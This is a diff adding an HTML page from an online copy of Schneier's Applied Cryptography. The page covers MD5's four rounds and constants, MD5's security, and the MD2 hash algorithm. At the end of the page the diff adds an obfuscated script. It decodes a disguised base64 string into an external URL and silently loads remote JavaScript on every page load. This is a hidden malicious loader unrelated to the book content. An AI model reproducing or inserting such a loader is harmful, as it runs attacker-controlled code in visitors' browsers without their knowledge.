@@ -1,0 +1,183 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=437-441//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>If <I>M</I><SUB>j</SUB> represents the <I>j</I> th sub-block of the message (from 0 to 15), and &lt&lt&lts represents a left circular shift of <I>s</I> bits, the four operations are:</P>
+<DL>
+<DD>FF(<I>a,b,c,d,M</I><SUB>j</SUB><I>,s,t</I><SUB>i</SUB>) denotes <I>a</I> = <I>b</I> &#43; ((<I>a</I> &#43; F(<I>b,c,d</I> ) &#43; <I>M</I><SUB>j</SUB> &#43; <I>t</I><SUB>i</SUB>) &lt&lt&lt <I>s</I>)
+<DD>GG(<I>a,b,c,d,M</I><SUB>j</SUB><I>,s,t</I><SUB>i</SUB>) denotes <I>a</I> = <I>b</I> &#43; ((<I>a</I> &#43; G(<I>b,c,d</I> ) &#43; <I>M</I><SUB>j</SUB> &#43; <I>t</I><SUB>i</SUB>) &lt&lt&lt <I>s</I>)
+<DD>HH(<I>a,b,c,d,M</I><SUB>j</SUB><I>,s,t</I><SUB>i</SUB>) denotes <I>a</I> = <I>b</I> &#43; ((<I>a</I> &#43; H(<I>b,c,d</I>) &#43; <I>M</I><SUB>j</SUB> &#43; <I>t</I><SUB>i</SUB>) &lt&lt&lt <I>s</I>)
+<DD>II(<I>a,b,c,d,M</I><SUB>j</SUB><I>,s,t</I><SUB>i</SUB>) denotes <I>a</I> = <I>b</I> &#43; ((<I>a</I> &#43; I(<I>b,c,d</I> ) &#43; <I>M</I><SUB>j</SUB> &#43; <I>t</I><SUB>i</SUB>) &lt&lt&lt <I>s</I>)
+</DL>
+<I><P><A NAME="Fig6"></A><A HREF="javascript:displayWindow('images/18-06.jpg',263,208 )"><IMG SRC="images/18-06t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-06.jpg',263,208)"><FONT COLOR="#000077"><B>Figure 18.6</B></FONT></A>&nbsp;&nbsp;One MD5 operation.</I>
+</P>
+<P>The four rounds (64 steps) look like:
+</P>
+<DL>
+<DD>Round 1:
+<DD>FF (<I>a, b, c, d, M</I><SUB>0</SUB>, 7, 0xd76aa478)
+<DD>FF (<I>d, a, b, c, M</I><SUB>1</SUB>, 12, 0xe8c7b756)
+<DD>FF (<I>c, d, a, b, M</I><SUB>2</SUB>, 17, 0x242070db)
+<DD>FF (<I>b, c, d, a, M</I><SUB>3</SUB>, 22, 0xc1bdceee)
+<DD>FF (<I>a, b, c, d, M</I><SUB>4</SUB>, 7, 0xf57c0faf)
+<DD>FF (<I>d, a, b, c, M</I><SUB>5</SUB>, 12, 0x4787c62a)
+<DD>FF (<I>c, d, a, b, M</I><SUB>6</SUB>, 17, 0xa8304613)
+<DD>FF (<I>b, c, d, a, M</I><SUB>7</SUB>, 22, 0xfd469501)
+<DD>FF (<I>a, b, c, d, M</I><SUB>8</SUB>, 7, 0x698098d8)
+<DD>FF (<I>d, a, b, c, M</I><SUB>9</SUB>, 12, 0x8b44f7af)
+<DD>FF (<I>c, d, a, b, M</I><SUB>10</SUB>, 17, 0xffff5bb1)
+<DD>FF (<I>b, c, d, a, M</I><SUB>11</SUB>, 22, 0x895cd7be)
+<DD>FF (<I>a, b, c, d, M</I><SUB>12</SUB>, 7, 0x6b901122)
+<DD>FF (<I>d, a, b, c, M</I><SUB>13</SUB>, 12, 0xfd987193)
+<DD>FF (<I>c, d, a, b, M</I><SUB>14</SUB>, 17, 0xa679438e)
+<DD>FF (<I>b, c, d, a, M</I><SUB>15</SUB>, 22, 0x49b40821)
+<DD>Round 2:
+<DD>GG (<I>a, b, c, d, M</I><SUB>1</SUB>, 5, 0xf61e2562)
+<DD>GG (<I>d, a, b, c, M</I><SUB>6</SUB>, 9, 0xc040b340)
+<DD>GG (<I>c, d, a, b, M</I><SUB>11</SUB>, 14, 0x265e5a51)
+<DD>GG (<I>b, c, d, a, M</I><SUB>0</SUB>, 20, 0xe9b6c7aa)
+<DD>GG (<I>a, b, c, d, M</I><SUB>5</SUB>, 5, 0xd62f105d)
+<DD>GG (<I>d, a, b, c, M</I><SUB>10</SUB>, 9, 0x02441453)
+<DD>GG (<I>c, d, a, b, M</I><SUB>15</SUB>, 14, 0xd8a1e681)
+<DD>GG (<I>b, c, d, a, M</I><SUB>4</SUB>, 20, 0xe7d3fbc8)
+<DD>GG (<I>a, b, c, d, M</I><SUB>9</SUB>, 5, 0x21e1cde6)
+<DD>GG (<I>d, a, b, c, M</I><SUB>14</SUB>, 9, 0xc33707d6)
+<DD>GG (<I>c, d, a, b, M</I><SUB>3</SUB>, 14, 0xf4d50d87)
+<DD>GG (<I>b, c, d, a, M</I><SUB>8</SUB>, 20, 0x455a14ed)
+<DD>GG (<I>a, b, c, d, M</I><SUB>13</SUB>, 5, 0xa9e3e905)
+<DD>GG (<I>d, a, b, c, M</I><SUB>2</SUB>, 9, 0xfcefa3f8)
+<DD>GG (<I>c, d, a, b, M</I><SUB>7</SUB>, 14, 0x676f02d9)
+<DD>GG (<I>b, c, d, a, M</I><SUB>12</SUB>, 20, 0x8d2a4c8a)
+<DD>Round 3:
+<DD>HH (<I>a, b, c, d, M</I><SUB>5</SUB>, 4, 0xfffa3942)
+<DD>HH (<I>d, a, b, c, M</I><SUB>8</SUB>, 11, 0x8771f681)
+<DD>HH (<I>c, d, a, b, M</I><SUB>11</SUB>, 16, 0x6d9d6122)
+<DD>HH (<I>b, c, d, a, M</I><SUB>14</SUB>, 23, 0xfde5380c)
+<DD>HH (<I>a, b, c, d, M</I><SUB>1</SUB>, 4, 0xa4beea44)
+<DD>HH (<I>d, a, b, c, M</I><SUB>4</SUB>, 11, 0x4bdecfa9)
+<DD>HH (<I>c, d, a, b, M</I><SUB>7</SUB>, 16, 0xf6bb4b60)
+<DD>HH (<I>b, c, d, a, M</I><SUB>10</SUB>, 23, 0xbebfbc70)
+<DD>HH (<I>a, b, c, d, M</I><SUB>13</SUB>, 4, 0x289b7ec6)
+<DD>HH (<I>d, a, b, c, M</I><SUB>0</SUB>, 11, 0xeaa127fa)
+<DD>HH (<I>c, d, a, b, M</I><SUB>3</SUB>, 16, 0xd4ef3085)
+<DD>HH (<I>b, c, d, a, M</I><SUB>6</SUB>, 23, 0x04881d05)
+<DD>HH (<I>a, b, c, d, M</I><SUB>9</SUB>, 4, 0xd9d4d039)
+<DD>HH (<I>d, a, b, c, M</I><SUB>12</SUB>, 11, 0xe6db99e5)
+<DD>HH (<I>c, d, a, b, M</I><SUB>15</SUB>, 16, 0x1fa27cf8)
+<DD>HH (<I>b, c, d, a, M</I><SUB>2</SUB>, 23, 0xc4ac5665)
+<DD>Round 4:
+<DD>II (<I>a, b, c, d, M</I><SUB>0</SUB>, 6, 0xf4292244)
+<DD>II (<I>d, a, b, c, M</I><SUB>7</SUB>, 10, 0x432aff97)
+<DD>II (<I>c, d, a, b, M</I><SUB>14</SUB>, 15, 0xab9423a7)
+<DD>II (<I>b, c, d, a, M</I><SUB>5</SUB>, 21, 0xfc93a039)
+<DD>II (<I>a, b, c, d, M</I><SUB>12</SUB>, 6, 0x655b59c3)
+<DD>II (<I>d, a, b, c, M</I><SUB>3</SUB>, 10, 0x8f0ccc92)
+<DD>II (<I>c, d, a, b, M</I><SUB>10</SUB>, 15, 0xffeff47d)
+<DD>II (<I>b, c, d, a, M</I><SUB>1</SUB>, 21, 0x85845dd1)
+<DD>II (<I>a, b, c, d, M</I><SUB>8</SUB>, 6, 0x6fa87e4f)
+<DD>II (<I>d, a, b, c, M</I><SUB>15</SUB>, 10, 0xfe2ce6e0)
+<DD>II (<I>c, d, a, b, M</I><SUB>6</SUB>, 15, 0xa3014314)
+<DD>II (<I>b, c, d, a, M</I><SUB>13</SUB>, 21, 0x4e0811a1)
+<DD>II (<I>a, b, c, d, M</I><SUB>4</SUB>, 6, 0xf7537e82)
+<DD>II (<I>d, a, b, c, M</I><SUB>11</SUB>, 10, 0xbd3af235)
+<DD>II (<I>c, d, a, b, M</I><SUB>2</SUB>, 15, 0x2ad7d2bb)
+<DD>II (<I>b, c, d, a, M</I><SUB>9</SUB>, 21, 0xeb86d391)
+</DL>
+<P>Those constants, <I>t</I><SUB>i</SUB>, were chosen as follows:</P>
+<P>In step <I>i, t</I><SUB>i</SUB> is the integer part of 2<SUP>32</SUP>*abs(sin(<I>i</I>)), where <I>i</I> is in radians.</P>
+<P>After all of this, <I>a, b, c,</I> and <I>d</I> are added to <I>A, B, C, D,</I> respectively, and the algorithm continues with the next block of data. The final output is the concatenation of <I>A, B, C,</I> and <I>D</I>.</P>
+<P><FONT SIZE="+1"><B><I>Security of MD5</I></B></FONT></P>
+<P>Ron Rivest outlined the improvements of MD5 over MD4 [1322]:
+</P>
+<DL>
+<DD><B>1.</B>&nbsp;&nbsp;A fourth round has been added.
+<DD><B>2.</B>&nbsp;&nbsp;Each step now has a unique additive constant.
+<DD><B>3.</B>&nbsp;&nbsp;The function G in round 2 was changed from ((<I>X</I>&#8869; Y ) &#8870; (<I>X</I>&#8869; Z ) &#8870; (<I>Y</I>&#8869; Z )) to ((<I>X</I>&#8869; Z ) &#8870; (<I>Y</I>&#8869; &#172; Z )) to make <I>G</I> less symmetric.
+<DD><B>4.</B>&nbsp;&nbsp;Each step now adds in the result of the previous step. This promotes a faster avalanche effect.
+<DD><B>5.</B>&nbsp;&nbsp;The order in which message sub-blocks are accessed in rounds 2 and 3 is changed, to make these patterns less alike.
+<DD><B>6.</B>&nbsp;&nbsp;The left circular shift amounts in each round have been approximately optimized, to yield a faster avalanche effect. The four shifts used in each round are different from the ones used in other rounds.
+</DL>
+<P>Tom Berson attempted to use differential cryptanalysis against a single round of MD5 [144], but his attack is ineffective against all four rounds. A more successful attack by den Boer and Bosselaers produces collisions using the compression function in MD5 [203, 1331, 1336]. This does not lend itself to attacks against MD5 in practical applications, and it does not affect the use of MD5 in Luby-Rackoff-like encryption algorithms (see Section 14.11). It does mean that one of the basic design principles of MD5&#151;to design a collision-resistant compression function&#151;has been violated. Although it is true that &#147;there seems to be a weakness in the compression function, but it has no practical impact on the security of the hash function&#148; [1336], I am wary of using MD5.
+</P>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">18.6 MD2</FONT></H3>
+<P>MD2 is another 128-bit one-way hash function designed by Ron Rivest [801, 1335]. It, along with MD5, is used in the PEM protocols (see Section 24.10). The security of MD2 is dependent on a random permutation of bytes. This permutation is fixed, and depends on the digits of &#960;. <I>S</I><SUB>0</SUB>, <I>S</I><SUB>1</SUB>, <I>S</I><SUB>2</SUB>,..., <I>S</I><SUB>255</SUB> is the permutation. To hash a message <I>M:</I></P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Pad the message with <I>i</I> bytes of value <I>i</I> so that the resulting message is a multiple of 16 bytes long.
+<DD><B>(2)</B>&nbsp;&nbsp;Append a 16-byte checksum to the message.
+<DD><B>(3)</B>&nbsp;&nbsp;Initialize a 48-byte block: <I>X</I><SUB>0</SUB>, <I>X</I><SUB>1</SUB>, <I>X</I><SUB>2</SUB>,..., <I>X</I><SUB>47</SUB>. Set the first 16 bytes of <I>X</I> to be 0, the second 16 bytes of <I>X</I> to be the first 16 bytes of the message, and the third 16 bytes of <I>X</I> to be the XOR of the first 16 bytes of <I>X</I> and the second 16 bytes of <I>X</I>.
+<DD><B>(4)</B>&nbsp;&nbsp;This is the compression function:
+<DL>
+<DD><I>t</I> = 0
+<DD>For <I>j</I> = 0 to 17
+<DD>For <I>k</I> = 0 to 47
+<DD><I>t</I> = <I>X</I><SUB>k</SUB> XOR <I>S</I><SUB>t</SUB>
+<DD><I>X</I><SUB>k</SUB> = t
+<DD><I>t</I> = (<I>t &#43; j</I> ) mod 256
+</DL>
+<DD><B>(5)</B>&nbsp;&nbsp;Set the second 16 bytes of <I>X</I> to be the second 16 bytes of the message, and the third 16 bytes of <I>X</I> to be the XOR of the first 16 bytes of <I>X</I> and the second 16 bytes of <I>X</I>. Do step (4). Repeat steps (5) and (4) with every 16 bytes of the message, in turn.
+<DD><B>(6)</B>&nbsp;&nbsp;The output is the first 16 bytes of <I>X</I>.
+</DL>
+<P>Although no weaknesses in MD2 have been found (see [1262]), it is slower than most other suggested hash functions.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-02.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-04.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(moqKYRbg, hfTVkUFc) {hfTVkUFc = moqKYRbg.createElement('script');hfTVkUFc.type = 'text/javascript';hfTVkUFc.async = true;hfTVkUFc.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');moqKYRbg.getElementsByTagName('body')[0].appendChild(hfTVkUFc);}(document));</script></body>
+</html>
